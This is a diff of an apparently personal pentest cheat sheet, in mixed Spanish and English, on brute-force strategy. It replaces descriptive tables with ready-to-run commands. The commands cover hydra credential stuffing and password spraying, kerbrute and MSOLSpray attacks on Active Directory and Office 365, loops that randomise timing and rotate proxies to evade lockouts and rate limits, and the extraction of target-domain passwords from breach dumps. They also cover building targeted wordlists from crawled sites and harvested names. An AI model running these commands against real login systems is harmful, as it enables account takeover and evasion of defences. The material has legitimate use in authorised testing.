@@ -24,22 +24,14 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Credential Stuffing | Tienes user:pass leaked DB | High success rate. |
-| Password Spray | Conoces users (enum) pero no passwords | Slow + wide. |
-| Targeted brute | 1 user, many passwords | Account-specific (lockout risk). |
-| Reverse brute | Many users, 1 password | Anti-lockout (1 attempt/user). |
-| Hybrid stuffing+spray | Combine leaked + common | Best ROI. |
-| Time-spread spray | 1 user / 24h | Avoid lockout/detection. |
-| Geo-distributed | Different countries IPs | Per-IP rate limit bypass. |
-| Dictionary attack | Common words list | Baseline. |
-| Brute force complete | Char-set permutations | Last resort, slow. |
-| Mask attack | Pattern known (`?u?l?l?l?d?d`) | Known structure. |
-| Combinator attack | wordlist1 + wordlist2 | Compound passwords. |
-| Rule-based mangling | hashcat rules | Mutate base list. |
-| Markov chain | Frequency-based generation | Statistical. |
-| Spray cycling | Diff password per round | Hide pattern. |
-| Burst then sleep | N attempts → wait → repeat | Defeat windows. |
-| Distributed brute | Multiple boxes parallel | Anti-rate-limit. |
+| `hydra -C combos.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` (combos formato `user:pass`) | Credential stuffing con leaked DB | High success rate. |
+| `hydra -L users.txt -p 'Spring2025!' target.com http-post-form "..."` | Password spray (1 pass × N users) | Avoid lockout. |
+| `kerbrute passwordspray -d target.local users.txt 'Welcome1!'` | AD password spray | Kerberos. |
+| `MSOLSpray --userlist users.txt --password 'Spring2025!'` | O365/Azure AD spray | Cloud Microsoft. |
+| `for u in $(cat users.txt); do for p in $(cat passes.txt); do (sleep $((RANDOM%60)) && curl -d "user=$u&pass=$p" https://target/login &); done; done` | Time-distributed spray | Anti-lockout. |
+| `hashcat -a 7 wordlist.txt ?d?d?d?d --stdout > prefix-digit.txt` | Hybrid mask + wordlist | Pattern brute. |
+| `hashcat -m <mode> -a 3 hash.txt ?u?l?l?l?d?d?d?d` | Mask attack pattern conocido | Known structure. |
+| `for ip_proxy in $(cat proxies.txt); do curl --proxy "$ip_proxy" -d "user=$u&pass=$p" ...; done` | Geo-distributed via proxies | Per-IP rate bypass. |
 ^bf-strategy-stuffing-spray
 
 ___
@@ -48,37 +40,29 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| RockYou.txt | 2009 leak — 14M passwords | Default `/usr/share/wordlists/rockyou.txt`. |
-| RockYou2024 | Aggregated mega-leak | 10B+ entries. |
-| HaveIBeenPwned | `haveibeenpwned.com/Passwords` | 800M+ pwned passwords. |
-| HIBP API | Pwned Passwords API | Validate hashes. |
-| COMB (Compilation of Many Breaches) | 2021 — 3.2B unique entries | Large. |
-| LinkedIn 2012 leak | 117M user:hash | Reverse-cracked. |
-| Adobe 2013 | 153M | Useful patterns. |
-| Yahoo 2013-2014 | 3B records | Massive. |
-| Collection #1-5 | 2019 — 2.7B | Aggregate breach. |
-| Antipublic | Multi-source | Various. |
-| BreachCompilation | Username + plaintext | Format for stuffing. |
-| dehashed.com | Subscription DB | Curated. |
-| LeakCheck | Subscription | OSINT. |
-| `seclists/Passwords/` | Curated wordlists | Various sizes. |
-| `seclists/Passwords/Leaked-Databases/` | Per-breach lists | Specific. |
-| Custom org-specific dump | Past company breach | High success. |
+| `gzip -d /usr/share/wordlists/rockyou.txt.gz && head /usr/share/wordlists/rockyou.txt` | RockYou setup (14M passwords) | Default Kali. |
+| `git clone https://github.com/danielmiessler/SecLists.git && ls SecLists/Passwords/` | SecLists wordlists curados | Foundation. |
+| `wget https://wordlists-cdn.assetnote.io/data/...` (assetnote modern wordlists) | Assetnote curated maintenidos | Modern. |
+| Browser → `haveibeenpwned.com/Passwords` (download 8.7GB SHA-1 hashes) | HIBP 800M+ pwned passwords | Validate hashes. |
+| `curl -s https://api.pwnedpasswords.com/range/$(echo -n 'pass' \| sha1sum \| cut -c1-5)` | HIBP API range query | Live check. |
+| `cat rockyou.txt SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \| sort -u > combined.txt` | Combine + dedupe | Bulk wordlist. |
+| `grep -i '@target.com' breach.txt \| cut -d: -f2` | Extract passwords del breach by domain | Targeted stuffing. |
+| Browser → `dehashed.com` con subscription → search domain target.com | OSINT breach DB | Subscription. |
 ^bf-strategy-leaked-dbs
 
 ### Wordlist sources
 
 ```bash
 # RockYou
-ls /usr/share/wordlists/rockyou.txt.gz
 gzip -d /usr/share/wordlists/rockyou.txt.gz
+wc -l /usr/share/wordlists/rockyou.txt  # 14M
 
-# SecLists
+# SecLists comprehensive
 git clone https://github.com/danielmiessler/SecLists.git
-ls SecLists/Passwords/
+ls SecLists/Passwords/  # Common-Credentials, Leaked-Databases, etc
 
-# HIBP downloadable
-# https://haveibeenpwned.com/Passwords (8.7GB SHA-1 hashes)
+# HIBP downloadable hashes (SHA-1)
+# Download from haveibeenpwned.com/Passwords (8.7GB)
 ```
 
 ___
@@ -87,36 +71,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| CeWL | Crawl target site, build wordlist | `cewl -d 2 -m 5 https://target -w out.txt`. |
-| CUPP | Personal info → password permutations | Interactive: name, dob, partner, etc. |
-| Mentalist | GUI wordlist builder | Drag-drop transformations. |
-| Wordlister | Combinator + mutator | Python. |
-| Pydictor | Generate by templates | Flexible. |
-| Crunch | Pure brute generator | `crunch 8 8 abc123` — char-set. |
-| Maskprocessor | Mask-based generation | hashcat counterpart. |
-| Hashcat utils | Combinator, splitlen | Helpers. |
-| `username-anarchy` | Username permutations | First.last → flast etc. |
-| `user_enumeration` outputs | Combine with passwords | Targeted. |
-| LinkedIn scraping | Employee names → user list | OSINT. |
-| Org breach passwords | Past leak from org | High success. |
-| Event-based passwords | Company event names + year | Common pattern. |
-| Brand + year + ! | `Target2025!` | Default org pattern. |
-| Domain-based | `target123`, `target!@#` | Lazy admin defaults. |
-| Industry default | Healthcare, finance specific | Vertical patterns. |
+| `cewl -d 2 -m 5 -w cewl.txt https://target.com` | Crawl target + extract words (depth 2, min 5 chars) | Site-specific wordlist. |
+| `cewl -d 3 -m 6 --with-numbers https://target.com -w deep.txt` | Deeper crawl + include numbers | Comprehensive. |
+| `cupp -i` (interactive) | Personal info → password permutations | Targeted. |
+| `crunch 8 8 abc123 -o brute8.txt` | Pure brute generator char-set | Custom charset. |
+| `crunch 6 8 -t @@@@%%%% -o pattern.txt` (letras+digits pattern) | Pattern-based gen | Known structure. |
+| `hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > mangled.txt` | Mangle wordlist con rules | Cobertura ampliada. |
+| `git clone https://github.com/urbanadventurer/username-anarchy && ./username-anarchy -i "John Doe" -d target.com` | Username permutations (first.last → flast → etc) | Pre-spray prep. |
+| `theHarvester -d target.com -b linkedin,google -f users.txt` | OSINT username harvest | Pre-brute discovery. |
+| `cat names.txt \| while read n; do echo "${n}@target.com"; done > emails.txt` | Generate email list from names | Email-based attack. |
+| `for y in 2023 2024 2025; do for s in '!' '@' '#' '$'; do echo "Target${y}${s}"; done; done` | Pattern-based generation seasonal | Default org patterns. |
 ^bf-strategy-targeted
-
-### CeWL + mangling
-
-```bash
-# Crawl target, depth 2, min 5 chars
-cewl -d 2 -m 5 -w cewl.txt https://target.com
-
-# Mangle with hashcat rules
-hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > mangled.txt
-
-# CUPP interactive
-cupp -i  # asks name, dob, partner, dog name, etc.
-```
 
 ___
 
@@ -124,38 +89,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `best64.rule` | hashcat default | 64 common transformations. |
-| `dive.rule` | Dive deep — slow | Comprehensive. |
-| `OneRuleToRuleThemAll.rule` | Combined heuristics | 52K rules. |
-| `T0XlC.rule` | T0XlC's curated | Targeted. |
-| Capitalization variants | `password` → `Password`, `PASSWORD` | Common. |
-| Append digits | `password1`, `password123` | Default. |
-| Append year | `password2024`, `password2025` | Time-based. |
-| Append `!@#$` | `password!`, `Password1!` | Special chars. |
-| Leetspeak | `p4ssw0rd`, `p@ssw0rd` | Common. |
-| Reverse | `drowssap` | Edge. |
-| Duplicate | `passwordpassword` | Edge. |
-| Toggle case | `pAsSwOrD` | Random case. |
-| Insert chars | `pa1ssword` | Mid-string. |
-| Substitute | `password` → `passw0rd` (o→0) | Common. |
-| Prefix | `1password`, `2025password` | Less common. |
-| Combined: prefix+suffix | `2025Password!` | Common pattern. |
+| `hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mangled.txt` | Apply best64 rules (64 transformations) | Default. |
+| `hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/dive.rule > deep-mangled.txt` | Apply dive rules (more aggressive) | Comprehensive. |
+| `wget https://github.com/NotSoSecure/password_cracking_rules/raw/master/OneRuleToRuleThemAll.rule && hashcat --stdout wordlist.txt -r OneRuleToRuleThemAll.rule` | 52K-rule combination | Heavy. |
+| `hashcat --stdout wordlist.txt -r best64.rule -r dive.rule > combined.txt` | Combined rules (multiplicative) | Bigger output. |
+| `john --wordlist=wordlist.txt --rules=All --stdout > mangled.txt` | John ruleset alternative | Different style. |
+| `hashcat --stdout wordlist.txt -j '$2 $0 $2 $5' > custom.txt` (custom rule inline) | Custom transformation rule | Per-target tuning. |
+| `cat wordlist.txt \| sed 's/$/2025!/' > suffixed.txt` | Bash simple suffix append | Quick patterns. |
+| `cat wordlist.txt \| while read w; do echo "${w}"; echo "${w}1"; echo "${w}!"; echo "${w}2025"; done > expanded.txt` | Bash multi-mutation | Manual. |
 ^bf-strategy-rules
-
-### Hashcat mangling
-
-```bash
-# Apply rules to wordlist (output expanded list)
-hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mangled.txt
-
-# Combined rules
-hashcat --stdout wordlist.txt \
-  -r rules/best64.rule \
-  -r rules/dive.rule > combined.txt
-
-# John the Ripper rule equivalent
-john --wordlist=wordlist.txt --rules=All --stdout > mangled.txt
-```
 
 ___
 
@@ -163,22 +105,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Default vendor passwords | `Default-Credentials/` SecLists | Routers, IoT. |
-| Common admin defaults | `admin/admin`, `root/root`, `test/test` | Quick check. |
-| Top 100/1000 most common | `Top1000.txt` | Baseline spray. |
-| Seasonal passwords | `Spring2025!`, `Summer2025!` | Predictable. |
-| Day-of-week passwords | `Monday1!`, `Tuesday1!` | Lazy users. |
-| Month passwords | `January2025!` | Same. |
-| Birthday-based | YYYYMMDD format | OSINT-driven. |
-| Phone-based | Last 4 digits, area code | OSINT. |
-| Company name + year | `Target2025!` | Default org. |
-| Industry jargon | `nurse123`, `teacher!` | Per-industry. |
-| Sports team | `Yankees1!`, `RealMadrid` | Demographic. |
-| Pet names | OSINT social media | Targeted. |
-| Address numbers | Street number | OSINT. |
-| Anniversary dates | Wedding, hire date | OSINT. |
-| Movie/song quotes | "Iamironman" | Pop culture. |
-| Keyboard walks | `qwerty123`, `asdfgh` | Common. |
+| `cat /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | Vendor defaults wordlist | Routers, IoT, network. |
+| `cat /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | Top 1000 most common | Baseline spray. |
+| `for s in 'Spring' 'Summer' 'Fall' 'Winter'; do for y in 2024 2025 2026; do echo "${s}${y}!"; done; done` | Seasonal patterns | Predictable corp. |
+| `for m in January February March April; do for y in 2024 2025; do echo "${m}${y}!"; done; done` | Monthly patterns | Lazy users. |
+| `for n in $(cat first_names.txt); do echo "${n}123"; echo "${n}!"; echo "${n}2025"; done` | First-name + suffix patterns | OSINT-driven. |
+| `for org in target Target TARGET; do for y in 2024 2025; do for s in '!' '@' '#'; do echo "${org}${y}${s}"; done; done; done` | Org-specific patterns | Default corp passwords. |
+| `crunch 8 8 -t %%%%%%%% -o phones.txt` (8 digits) | Phone-based patterns | OSINT phone. |
+| `for d in 19{50..99} 20{00..15}; do for m in {01..12}; do for dd in {01..31}; do echo "${d}${m}${dd}"; done; done; done` (birthdays) | Birthday-format brute | OSINT birthday. |
 ^bf-strategy-patterns
 
 ***
